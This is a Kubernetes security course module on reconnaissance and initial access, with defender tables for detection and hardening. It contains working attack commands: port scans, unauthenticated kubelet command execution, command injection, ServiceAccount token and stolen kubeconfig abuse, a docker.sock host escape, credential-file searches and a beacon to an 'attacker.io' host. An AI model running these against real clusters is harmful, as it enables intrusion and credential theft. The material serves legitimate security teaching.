# Reconnaissance & Initial Access — Getting Your First Foothold

> **Module 02 · Course 38** — The attacker's first question is always: *"What can I reach, and what does it tell me?"* Reconnaissance is systematic — not random clicking. This module teaches both sides: how attackers map the K8s attack surface from outside and inside, and what defenders see when it's happening.

---

## The Two Phases

Reconnaissance and initial access aren't strictly sequential — they alternate. The attacker scans externally, finds an opening, gets inside, then does *more* reconnaissance from their new position. Each foothold expands the visible attack surface.

```
External recon              Initial Access              Internal recon
─────────────────           ──────────────              ───────────────
Scan for open ports    ──►  Exploit exposed API  ──►   List all namespaces
Find Dashboard URL     ──►  Log in with no auth  ──►   Auth can-i --list
Enumerate DNS names    ──►  RCE in web app       ──►   Read SA token
Check GitHub repos     ──►  Stolen kubeconfig    ──►   List secrets
```

Each box is both a reconnaissance technique and a potential pivot point.

---

## Phase 1: External Reconnaissance

### Port Scanning — Finding the Attack Surface

Kubernetes exposes several ports that an attacker looks for:

| Port | Service | Default exposure |
|------|---------|-----------------|
| 6443 | Kubernetes API server (HTTPS) | Usually internet-exposed in managed clusters |
| 8080 | Kubernetes API server (HTTP, insecure) | Should never be open — but sometimes is |
| 10250 | Kubelet API | Should be internal-only — often misconfigured |
| 10255 | Kubelet read-only API | No auth required — exposes pod/node info |
| 2379–2380 | etcd | Should NEVER be internet-facing |
| 30000–32767 | NodePort range | App-specific — often over-exposed |

```bash
# External attacker scanning a known IP range:
nmap -sS -p 6443,8080,10250,10255,2379,2380 --open 10.0.0.0/8

# If 6443 is open:
curl -k https://TARGET:6443/api/v1
# If this returns a 200 with JSON → anonymous access is enabled → critical finding
# If it returns 401 → auth required → need credentials
```

### Dashboard Hunting

The Kubernetes Dashboard is a legitimate tool — but deployed without auth (or with `--enable-skip-login`) it's a free cluster-admin console for anyone who finds the URL.

```bash
# The dashboard is usually on a NodePort or LoadBalancer:
# Try the common port:
curl http://TARGET:30000
curl http://TARGET:30080
# Or via kubectl (if you have it):
kubectl proxy --port=8001 &
curl http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/

# In older setups, the dashboard was behind no auth and had ClusterAdmin access
# Modern setups still expose it without restricting the ServiceAccount it uses
```

### GitHub and Registry Recon

Before touching the cluster, attackers look at:
- GitHub repos for `kubeconfig` files, hardcoded tokens, CI secrets
- DockerHub/GHCR for image names that reveal internal service names
- Job postings that mention specific K8s versions or tooling
- Error messages in public-facing apps that leak namespace/pod names

```bash
# GitHub dork for leaked kubeconfig:
# site:github.com "current-context" "users:" "clusters:"

# Check public image for hardcoded secrets:
docker pull target-org/api-service:latest
docker history target-org/api-service:latest
# ARG DATABASE_URL=postgres://... leaks credentials in build history
```

---

## Phase 2: Gaining Initial Access

### Technique 1: Default ServiceAccount Token Abuse

Every pod in every namespace gets a ServiceAccount token auto-mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. The `default` ServiceAccount in older clusters (pre-1.24, or with legacy RBAC) often has more permissions than it should.

```bash
# From inside ANY pod (even a legit application pod you've compromised):
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default

# Check what namespace you're in:
echo $NAMESPACE

# Enumerate permissions:
curl -s --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
  -H "Content-Type: application/json"
```

The attack surface diagram:

```
internet ──► LoadBalancer:443 ──► app pod ──► RCE ──► container shell
                                                            │
                                                            ▼
                                      /var/run/secrets/kubernetes.io/serviceaccount/
                                            ├── token     ← Your first credential
                                            ├── ca.crt    ← Trust the API server
                                            └── namespace ← Know where you are

container shell ──► curl -k https://kubernetes.default/api/v1/namespaces
                    Authorization: Bearer $TOKEN
                    ← "What can I do with this token?"
```

### Technique 2: Exposed Kubelet API (Port 10250)

The kubelet has an API that the API server uses to manage pods on the node. If it's exposed to the internet (or to pods) without auth, an attacker can run commands in any pod on that node.

```bash
# From outside (if the node's port 10250 is exposed):
# List all pods on the node:
curl -sk https://NODE_IP:10250/pods | python3 -m json.tool | grep '"name"'

# Run a command in a specific container (no auth required if anonymous=true):
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
  -d "cmd=cat /etc/passwd"

# The kubelet's /exec endpoint can even give a shell:
# This is equivalent to kubectl exec without needing the API server at all
```

Why is this dangerous? The kubelet has access to all pods on the node. An attacker who can hit the kubelet API can run commands in pods they'd never have RBAC permission to exec into normally — because the kubelet doesn't check RBAC, it only checks its own auth config.

### Technique 3: Exploiting a Vulnerable Application

The most common initial access in real breaches. A web application running in a pod has an RCE vulnerability. The attacker exploits it and gets a shell in the container.

```bash
# Classic RCE in a web app (e.g., a command injection in a URL parameter):
curl 'https://target.com/api/ping?host=localhost; id'
# uid=1000(app) gid=1000(app) groups=1000(app)
# → We have a shell!

# From the shell, first thing to do:
uname -a                    # kernel version
cat /proc/version           # more kernel info
env | grep -i k8s           # K8s-injected environment variables
ls /var/run/secrets/        # ServiceAccount token?
ip addr                     # What network do we have?
```

### Technique 4: Stolen kubeconfig / Compromised CI

Attackers targeting a specific org will look at:
- Developer workstations: `~/.kube/config` often contains cluster-admin credentials
- CI/CD systems: GitHub Actions, Jenkins, GitLab CI often have kubeconfig as a secret
- Helm values files committed to git with hardcoded credentials
- Terraform state files that contain K8s credentials

```bash
# If you have a leaked kubeconfig:
export KUBECONFIG=/tmp/stolen-kubeconfig
kubectl auth can-i --list
# If this shows */* → cluster-admin → game over
kubectl get secrets -A
kubectl get nodes
```

---

## Phase 3: Internal Reconnaissance (Post-Foothold)

Once inside a pod, the attacker runs a systematic enumeration before doing anything destructive.

### The Attacker's First Commands

```bash
# ── Step 1: Where am I? ──
hostname                                     # container/pod name
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace  # which namespace
uname -a                                     # kernel version (for escape CVEs)
id                                           # running as root? non-root?
env                                          # environment variables (secrets?)

# ── Step 2: What's my identity? ──
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# Decode the JWT to see the SA name:
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# ── Step 3: What can my SA do? ──
# (kubectl must be in the container, or use curl)
kubectl auth can-i --list 2>/dev/null || \
curl -sk https://kubernetes.default/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'

# ── Step 4: What exists in the cluster? ──
kubectl get namespaces 2>/dev/null
kubectl get pods -A 2>/dev/null
kubectl get services -A 2>/dev/null
kubectl get secrets -A 2>/dev/null

# ── Step 5: Network reconnaissance ──
# What other services can I reach?
nslookup kubernetes.default.svc.cluster.local
# Kubernetes DNS: <service>.<namespace>.svc.cluster.local
# Try reaching other services:
curl -sk https://kubernetes.default/healthz
curl http://backend-svc.production.svc.cluster.local:8080/health

# ── Step 6: Can I get out to the internet? ──
curl https://ifconfig.me          # Get public IP — NAT via node?
curl https://attacker.io/beacon   # Is there egress filtering?
```

### DNS Enumeration

Inside a pod, Kubernetes DNS reveals the entire service topology:

```bash
# List all services via DNS brute-force:
# (slower but works without kubectl)
for ns in default kube-system production staging backend frontend; do
  for svc in api web backend frontend db redis queue; do
    result=$(nslookup $svc.$ns.svc.cluster.local 2>&1)
    echo "$svc.$ns → $result" | grep -v NXDOMAIN
  done
done

# Or if you have kubectl:
kubectl get svc -A -o wide
```

### Looking for Sensitive Mounts

```bash
# Check what volumes are mounted:
mount | grep -v "proc\|sys\|dev\|cgroup"
df -h

# Is the Docker socket mounted? (Classic escape vector)
ls -la /var/run/docker.sock
# If this exists: docker run --rm -v /:/host alpine chroot /host

# Is there a hostPath mount?
ls /host/ 2>/dev/null
# If this contains /etc, /var, /proc → full node filesystem access

# Are there credential files mounted?
find / -name "*.pem" -o -name "kubeconfig" -o -name "config" 2>/dev/null | \
  grep -v proc | head -20
```

---

## What Defenders See

Every reconnaissance action above leaves traces. Here's what good detection looks like:

| Attacker action | Kubernetes audit log event | Falco rule |
|----------------|---------------------------|------------|
| `kubectl auth can-i --list` | `create selfsubjectrulesreviews` | — (API call, not syscall) |
| `kubectl get secrets -A` | `list secrets` in multiple namespaces | — |
| Curl to 10250 from pod | Network connection to 10250 | Falco: unexpected outbound connection |
| Read `/proc/version` | — | Falco: Read sensitive file untouched under /proc |
| Docker socket access | — | Falco: Container with sensitive mount |
| `nslookup` / DNS enum | — | Falco: DNS lookup for external/unusual names |

The key insight: **most reconnaissance is invisible without audit logging and runtime detection.** A pod listing secrets via the K8s API leaves an audit log entry — but only if audit logging is configured to capture `list` events on `secrets`. Most clusters don't. We'll fix that in Module 11.

---

## Defense: What Stops This

| Attack vector | Defense |
|--------------|---------|
| Exposed Kubernetes Dashboard | Never expose without auth; use OIDC; pin to localhost+port-forward |
| Anonymous API server access | `--anonymous-auth=false` on API server |
| Exposed kubelet | `--anonymous-auth=false` on kubelet; NodePort firewall rules |
| Default SA token auto-mount | `automountServiceAccountToken: false` on namespaces and pods |
| Overly permissive SA | Least-privilege RBAC; audit with `kubectl auth can-i` as the SA |
| Reachable IMDS from pods | NetworkPolicy denying 169.254.169.254; enforce IMDSv2 |
| No egress filtering | Egress NetworkPolicy: allow only specific external endpoints |

> The hardening details for all of these are in Modules 10–11.

---

## Checkpoint

You're ready for Module 03 when you can answer:

1. What K8s ports does an external attacker scan for, and what does each one indicate?
2. What file inside every pod contains the ServiceAccount token?
3. Why is port 10250 more dangerous to expose than port 6443?
4. What command does an attacker run to enumerate their SA's permissions from inside a pod?
5. What is the K8s DNS pattern for reaching a service in another namespace?
6. How do you check if a Docker socket is mounted in a container?
7. What audit log event does `kubectl get secrets -A` produce?
8. Why does auto-mounted ServiceAccount token create an attack surface even in a totally legitimate pod?
9. Name two things an attacker looks at on GitHub before touching the cluster directly.
10. What does the `SelfSubjectRulesReview` API return and why is it the attacker's first API call?

➡ Next: **Execution, Privilege Escalation & Persistence** — turning a container shell into full node access, and making sure you stay.
